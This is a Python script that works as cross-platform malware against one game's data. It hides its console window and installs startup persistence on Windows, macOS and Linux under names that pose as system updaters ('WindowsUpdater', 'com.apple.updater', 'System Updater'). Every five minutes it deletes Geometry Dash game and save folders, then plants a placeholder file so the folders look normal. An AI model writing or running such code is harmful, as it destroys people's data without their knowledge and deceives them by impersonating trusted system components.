#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Tue Apr  7 12:48:48 2026

@author: mm
"""

import os
import time
import sys
import shutil
import subprocess
import platform

def hide_console():
    """Hide the console window on Windows"""
    if platform.system() == "Windows":
        import win32gui
        import win32con
        the_program_to_hide = win32gui.GetForegroundWindow()
        win32gui.ShowWindow(the_program_to_hide, win32con.SW_HIDE)

def find_geometry_dash_data():
    """Find Geometry Dash data directories on different platforms"""
    system = platform.system()
    gd_paths = []
    
    if system == "Windows":
        # Common Windows paths for Geometry Dash data
        paths_to_check = [
            os.path.expandvars("%LOCALAPPDATA%\\GeometryDash"),
            os.path.expandvars("%APPDATA%\\GeometryDash"),
            os.path.expandvars("%PROGRAMFILES%\\Steam\\steamapps\\common\\Geometry Dash"),
            os.path.expandvars("%PROGRAMFILES(X86)%\\Steam\\steamapps\\common\\Geometry Dash")
        ]
        gd_paths = [p for p in paths_to_check if os.path.exists(p)]
        
    elif system == "Darwin":  # macOS
        paths_to_check = [
            os.path.expanduser("~/Library/Application Support/GeometryDash"),
            os.path.expanduser("~/Library/Application Support/Steam/steamapps/common/Geometry Dash")
        ]
        gd_paths = [p for p in paths_to_check if os.path.exists(p)]
        
    elif system == "Linux":
        paths_to_check = [
            os.path.expanduser("~/.local/share/GeometryDash"),
            os.path.expanduser("~/.steam/steam/steamapps/common/Geometry Dash")
        ]
        gd_paths = [p for p in paths_to_check if os.path.exists(p)]
    
    return gd_paths

def delete_geometry_dash_data(paths):
    """Delete Geometry Dash data from the given paths"""
    for path in paths:
        try:
            if os.path.exists(path):
                # Try to delete the directory and all its contents
                shutil.rmtree(path, ignore_errors=True)
                print(f"Deleted: {path}")
                
                # Create an empty directory to replace it
                os.makedirs(path, exist_ok=True)
                
                # Create a dummy file to make it seem normal
                with open(os.path.join(path, "placeholder.txt"), "w") as f:
                    f.write("This file will be deleted next time.")
        except Exception as e:
            print(f"Error deleting {path}: {e}")

def setup_persistence():
    """Set up the script to run on system startup"""
    system = platform.system()
    script_path = os.path.abspath(sys.argv[0])
    
    if system == "Windows":
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsUpdater", 0, winreg.REG_SZ, script_path)
            winreg.CloseKey(key)
        except:
            pass
    
    elif system == "Darwin":  # macOS
        try:
            launch_agents_path = os.path.expanduser("~/Library/LaunchAgents")
            os.makedirs(launch_agents_path, exist_ok=True)
            
            plist_path = os.path.join(launch_agents_path, "com.apple.updater.plist")
            with open(plist_path, "w") as f:
                f.write(f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.updater</string>
    <key>ProgramArguments</key>
    <array>
        <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>""")
            subprocess.run(["launchctl", "load", plist_path], check=False)
        except:
            pass
    
    elif system == "Linux":
        try:
            autostart_path = os.path.expanduser("~/.config/autostart")
            os.makedirs(autostart_path, exist_ok=True)
            
            desktop_path = os.path.join(autostart_path, "system-updater.desktop")
            with open(desktop_path, "w") as f:
                f.write(f"""[Desktop Entry]
Type=Application
Name=System Updater
Exec={script_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
""")
            os.chmod(desktop_path, 0o755)
        except:
            pass

def main():
    # Hide the console window
    hide_console()
    
    # Set up persistence to run on startup
    setup_persistence()
    
    # Main loop to repeatedly delete Geometry Dash data
    while True:
        gd_paths = find_geometry_dash_data()
        if gd_paths:
            delete_geometry_dash_data(gd_paths)
        
        # Wait for 5 minutes before checking again
        time.sleep(300)

if __name__ == "__main__":
    main()